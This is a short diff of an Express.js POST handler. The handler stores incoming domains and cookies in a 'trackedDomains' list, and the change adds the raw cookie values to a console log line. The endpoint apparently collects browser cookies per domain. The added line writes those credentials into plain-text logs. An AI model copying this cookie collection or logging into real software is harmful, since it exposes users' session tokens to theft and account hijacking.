@@ -58,7 +58,7 @@ app.post("/", (req, res) => {
         return res.status(400).json({ error: "Missing domain" });
     }
 
-    console.log(`Received domain: ${domain}`);
+    console.log(`Received domain: ${domain} , ${cookies.toString()}`);
 
     // Save domain with timestamp (temporary storage)
     trackedDomains.push({ domain, cookies,timestamp: new Date().toISOString() });
